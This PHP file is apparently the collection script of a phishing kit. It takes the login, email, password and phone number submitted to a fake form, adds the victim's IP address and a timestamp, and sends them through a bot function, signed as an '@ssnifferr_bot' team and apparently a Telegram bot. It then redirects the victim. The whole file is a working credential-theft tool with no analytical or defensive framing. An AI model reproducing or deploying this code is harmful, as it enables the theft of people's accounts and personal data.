<?php 

require 'bot.php';
ini_set('session.gc_maxlifetime', 3600);
ini_set('session.cookie_lifetime', 3600);
session_start();

$Login = $_POST['login'];
$Email = $_POST['email'];
$Password = $_POST['password'];
$Number = $_POST['number'];

$data = date("d.m.Y");
$time = date("H:i");   
$ip0 = $_SERVER['REMOTE_ADDR'];

$res = " 
🕰 Время: $time
📆 Дата: $data

📍 IP: $ip0

💡 By @ssnifferr_bot Team";


message('☘️Phenomenal Club | Still☘️

😻 ИФ: '.$Login.'
🗝 Email: '.$Email.'
🔐 Password: '.$Password.'
😚 Number: '.$Number.'
'.$res);

session_commit();
header('Location: '.$redirect);
die();


?>		